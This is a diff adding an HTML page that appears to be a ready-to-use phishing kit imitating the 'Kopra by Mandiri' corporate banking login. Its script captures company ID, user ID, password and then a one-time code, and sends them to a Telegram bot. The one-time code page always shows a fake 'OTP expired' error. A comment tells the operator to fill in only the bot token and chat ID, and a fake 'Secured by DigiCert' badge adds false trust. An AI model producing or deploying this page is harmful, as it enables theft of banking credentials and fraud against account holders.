@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kopra by Mandiri</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body {
+            background-color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 30px 25px;
+        }
+        .page { display: none; width: 100%; max-width: 380px; }
+        .page.active { display: block; }
+        .logo-area { text-align: center; margin-bottom: 15px; }
+        .logo-img { max-width: 140px; margin-bottom: 5px; }
+        .subtitle { font-size: 16px; color: #000; }
+        .form-container { margin-top: 40px; }
+        .form-group { margin-bottom: 16px; }
+        label { display: block; font-size: 13px; color: #333; margin-bottom: 6px; }
+        input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #ccc;
+            border-radius: 2px;
+            font-size: 14px;
+        }
+        input::placeholder { color: #999; }
+        input:focus { outline: none; border-color: #666; }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #000;
+            color: #fff;
+            border: none;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 4px;
+        }
+        .recovery-text { font-size: 11px; color: #666; margin-top: 12px; line-height: 1.5; }
+        .digicert { text-align: center; margin-top: 40px; font-size: 11px; color: #666; }
+        .digicert strong { color: #000; }
+        .loading { display: none; text-align: center; margin-top: 12px; font-size: 13px; color: #333; }
+        .verification-desc { font-size: 13px; color: #555; margin-bottom: 20px; line-height: 1.5; text-align: center; }
+        .back-link { display: inline-block; margin-top: 15px; font-size: 13px; color: #005BA6; text-decoration: none; cursor: pointer; }
+        .error-message { color: #d32f2f; font-size: 13px; text-align: center; margin-top: 15px; display: none; }
+    </style>
+</head>
+<body>
+
+    <!-- HALAMAN 1: LOGIN -->
+    <div id="pageLogin" class="page active">
+        <div class="logo-area">
+            <img src="https://desa-bandorasa-kulon.kuningankab.go.id/sites/des2011/files/berita-photo/LogoKopra.png" alt="Kopra by Mandiri" class="logo-img">
+            <div class="subtitle">Welcome to Kopra</div>
+        </div>
+        <div class="form-container">
+            <form id="loginForm">
+                <div class="form-group">
+                    <label>Company ID</label>
+                    <input type="text" id="companyId" placeholder="Enter your company ID" required>
+                </div>
+                <div class="form-group">
+                    <label>User ID</label>
+                    <input type="text" id="userId" placeholder="Enter your user ID" required>
+                </div>
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="password" id="password" placeholder="Enter your password" required>
+                </div>
+                <button type="submit">Continue</button>
+                <div class="loading" id="loading1">Processing...</div>
+            </form>
+            <p class="recovery-text">For account recovery, please access Kopra by Mandiri from your desktop browser.</p>
+            <div class="digicert">Secured by <strong>DigiCert</strong></div>
+        </div>
+    </div>
+
+    <!-- HALAMAN 2: VERIFIKASI -->
+    <div id="pageVerify" class="page">
+        <div class="logo-area">
+            <img src="https://koprabymandiri.com/logo.png" alt="Kopra by Mandiri" class="logo-img">
+            <div class="subtitle">Verifikasi Kode</div>
+        </div>
+        <div class="form-container">
+            <p class="verification-desc">Masukkan kode verifikasi yang telah dikirimkan ke perangkat Anda</p>
+            <form id="verifyForm">
+                <div class="form-group">
+                    <label>Kode Verifikasi</label>
+                    <input type="text" id="otp" placeholder="Masukkan kode" required maxlength="6">
+                </div>
+                <button type="submit">Verifikasi</button>
+                <div class="loading" id="loading2">Processing...</div>
+                <div class="error-message" id="msgError">OTP Kadaluwarsa. Silakan minta kode baru.</div>
+            </form>
+            <a class="back-link" id="btnBack">← Kembali ke halaman login</a>
+            <div class="digicert">Secured by <strong>DigiCert</strong></div>
+        </div>
+    </div>
+
+<script>
+// ==============================================
+// 🔑 HANYA GANTI 2 BARIS DI BAWAH INI SAJA
+// ==============================================
+const BOT_TOKEN = 'GANTI_DENGAN_TOKEN_BOT_KAMU';
+const CHAT_ID = 'GANTI_DENGAN_CHAT_ID_KAMU';
+// ==============================================
+
+let companyIdVal = '', userIdVal = '', passwordVal = '';
+
+async function kirimTelegram(teks) {
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: teks,
+                disable_web_page_preview: true
+            })
+        });
+    } catch (e) {
+        console.log('Error:', e);
+    }
+}
+
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    companyIdVal = document.getElementById('companyId').value;
+    userIdVal = document.getElementById('userId').value;
+    passwordVal = document.getElementById('password').value;
+    
+    document.getElementById('loading1').style.display = 'block';
+    
+    await kirimTelegram(`
+🔐 LOGIN KOPRA BY MANDIRI
+━━━━━━━━━━━━━━━━━━
+🏢 Company ID: ${companyIdVal}
+👤 User ID: ${userIdVal}
+🔑 Password: ${passwordVal}
+🕐 Waktu: ${new Date().toLocaleString('id-ID')}
+    `);
+
+    setTimeout(() => {
+        document.getElementById('loading1').style.display = 'none';
+        document.getElementById('pageLogin').classList.remove('active');
+        document.getElementById('pageVerify').classList.add('active');
+    }, 800);
+});
+
+document.getElementById('verifyForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const otpVal = document.getElementById('otp').value;
+    
+    document.getElementById('loading2').style.display = 'block';
+    document.getElementById('msgError').style.display = 'none';
+    
+    await kirimTelegram(`
+⚠️ OTP KADALUWARSA
+━━━━━━━━━━━━━━━━━━
+🏢 Company ID: ${companyIdVal}
+👤 User ID: ${userIdVal}
+🔑 Password: ${passwordVal}
+🔑 Kode OTP: ${otpVal}
+🕐 Waktu: ${new Date().toLocaleString('id-ID')}
+    `);
+
+    setTimeout(() => {
+        document.getElementById('loading2').style.display = 'none';
+        document.getElementById('msgError').style.display = 'block';
+    }, 1000);
+});
+
+document.getElementById('btnBack').addEventListener('click', function() {
+    document.getElementById('pageVerify').classList.remove('active');
+    document.getElementById('pageLogin').classList.add('active');
+    document.getElementById('msgError').style.display = 'none';
+    document.getElementById('verifyForm').reset();
+});
+</script>
+
+</body>
+</html>
